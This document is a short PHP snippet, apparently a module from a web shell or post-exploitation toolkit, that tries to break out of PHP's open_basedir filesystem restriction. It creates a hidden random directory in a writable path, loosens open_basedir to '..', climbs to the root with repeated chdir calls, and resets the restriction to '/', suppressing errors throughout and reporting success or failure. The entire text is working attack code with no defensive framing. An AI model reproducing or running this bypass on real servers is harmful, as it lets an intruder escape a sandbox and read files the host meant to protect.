ob_start();
$opdir = @ini_get('open_basedir');
if (!$opdir) {
    ob_end_clean();
    return "INFO: open_basedir is not active";
}

$ocwd = dirname($_SERVER['SCRIPT_FILENAME']);
$oparr = array_filter(array_unique(array_merge(
    preg_split('/[;:]/', $opdir),
    [$ocwd, sys_get_temp_dir(), '/tmp', '/var/tmp']
)));

$bypassed = false;
foreach ($oparr as $item) {
    if (!@is_writable($item)) continue;

    $tmdir = $item . '/.' . md5(time() . mt_rand());
    if (!@mkdir($tmdir, 0777, true)) continue;
    if (!@is_dir($tmdir)) continue;

    if (!@chdir($tmdir)) {
        @rmdir($tmdir);
        continue;
    }

    if (!@ini_set('open_basedir', '..')) {
        @chdir($ocwd);
        @rmdir($tmdir);
        continue;
    }

    $depth = substr_count($tmdir, '/') + substr_count($tmdir, '\\');
    for ($i = 0; $i < $depth; $i++) {
        if (!@chdir('..')) break;
    }

    if (@ini_set('open_basedir', '/')) {
        $bypassed = true;
        @chdir($ocwd);
        @rmdir($tmdir);
        break;
    }

    @chdir($ocwd);
    @rmdir($tmdir);
}

ob_end_clean();

if ($bypassed) {
    return "SUCCESS: open_basedir bypassed";
} else {
    return "ERROR: open_basedir bypass failed";
}
